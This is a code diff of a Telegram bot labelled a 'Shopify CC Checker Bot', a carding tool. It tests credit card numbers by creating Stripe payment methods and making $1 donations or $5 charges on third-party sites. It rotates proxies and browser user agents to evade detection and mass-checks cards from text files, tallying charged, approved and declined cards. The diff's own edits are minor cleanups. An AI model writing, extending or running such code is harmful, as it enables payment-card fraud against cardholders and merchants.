@@ -1,4 +1,4 @@
-# bot.py - Shopify CC Checker Bot (No fake_useragent dependency)
+# bot.py - Shopify CC Checker Bot (Fixed imports)
 from urllib.parse import quote
 from telethon import TelegramClient, events, Button
 from telethon.tl.types import MessageEntityCustomEmoji
@@ -6,7 +6,7 @@ from telethon.extensions import html as thtml
 import random, datetime, os, re, asyncio, time, string, aiofiles, aiohttp, json, uuid, warnings, signal
 
 from database import (
-    init_db, close_db, ensure_user, get_user_plan, set_user_plan, is_banned_user,
+    init_db, ensure_user, get_user_plan, set_user_plan, is_banned_user,
     ban_user, unban_user, create_key, use_key, get_all_keys, delete_key,
     add_proxy_db, get_random_proxy, get_all_user_proxies, get_proxy_count,
     remove_proxy_by_index, clear_all_proxies, add_site_db, get_user_sites,
@@ -37,7 +37,7 @@ CE = {
 }
 PE = "⭐"
 
-# ========== Random User Agent (no external lib) ==========
+# ========== Random User Agent ==========
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -152,9 +152,9 @@ async def test_proxy(proxy_url):
         timeout = aiohttp.ClientTimeout(total=10)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get('http://httpbin.org/ip', proxy=proxy_url) as resp:
-                return resp.status == 200, None
+                return resp.status == 200
     except:
-        return False, None
+        return False
 
 async def get_bin_info(card_number):
     try:
@@ -266,7 +266,6 @@ async def stripe1_check(cc, month, year, cvv, proxy_url):
         if len(year) == 2: year = f"20{year}"
         
         async with aiohttp.ClientSession() as session:
-            # Create payment method
             data = {
                 'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
                 'card[exp_month]': month, 'card[exp_year]': year,
@@ -280,7 +279,6 @@ async def stripe1_check(cc, month, year, cvv, proxy_url):
                 pm_id = pm_data.get('id')
                 if not pm_id: return "Declined", "No payment method"
             
-            # Make donation
             donate_data = {
                 'give-amount': '1', 'give_stripe_payment_method': pm_id,
                 'give_first': 'John', 'give_last': 'Doe', 'give_email': email,
@@ -315,14 +313,12 @@ async def start(event):
 ━━━━━━━━━━━━━━━━━
 {PE} <code>/sh</code> - Single CC check
 {PE} <code>/mtxt</code> - Mass CC from .txt
-{PE} <code>/ran</code> - Random site check
 {PE} <code>/sd</code> - Stripe $5 charge
 {PE} <code>/s1</code> - Stripe $1 donation
 ━━━━━━━━━━━━━━━━━
 {PE} <code>/add</code> - Add sites
 {PE} <code>/rm</code> - Remove sites
 {PE} <code>/sites</code> - List sites
-{PE} <code>/check</code> - Test sites
 ━━━━━━━━━━━━━━━━━
 {PE} <code>/addpxy</code> - Add proxy
 {PE} <code>/proxy</code> - List proxies
@@ -357,12 +353,10 @@ async def sh_cmd(event):
     
     await ensure_user(event.sender_id)
     
-    # Get proxy
     proxy_data = await get_random_proxy(event.sender_id)
     if not proxy_data:
         return await styled_reply(event, f"{PE} No proxy! Use /addpxy", emoji_ids=[CE["warn"]])
     
-    # Extract card
     card = None
     if event.reply_to_msg_id:
         replied = await event.get_reply_message()
@@ -442,10 +436,8 @@ async def mtxt_cmd(event):
         cards = cards[:limit]
     
     ACTIVE_PROCESSES[event.sender_id] = True
-    await styled_reply(event, f"{PE} Checking {len(cards)} cards...", emoji_ids=[CE["bolt"]])
-    
     charged = approved = declined = 0
-    status_msg = await styled_reply(event, f"{PE} Processing...", emoji_ids=[CE["chart"]])
+    status_msg = await styled_reply(event, f"{PE} Checking {len(cards)} cards...", emoji_ids=[CE["chart"]])
     
     for card in cards:
         if event.sender_id not in ACTIVE_PROCESSES:
@@ -459,6 +451,7 @@ async def mtxt_cmd(event):
             declined += 1
         
         await styled_edit(status_msg, f"{PE} ✅ Charged: {charged} | ✅ Approved: {approved} | ❌ Declined: {declined}\n📊 {charged+approved+declined}/{len(cards)}", emoji_ids=[CE["chart"]])
+        await asyncio.sleep(0.5)
     
     await styled_edit(status_msg, f"{PE} <b>COMPLETE</b>\n━━━━━━━━━━━━━━━━━\n{PE} Charged: {charged}\n{PE} Approved: {approved}\n{PE} Declined: {declined}\n━━━━━━━━━━━━━━━━━\n{PE} Total: {len(cards)}", emoji_ids=[CE["party"]])
     ACTIVE_PROCESSES.pop(event.sender_id, None)
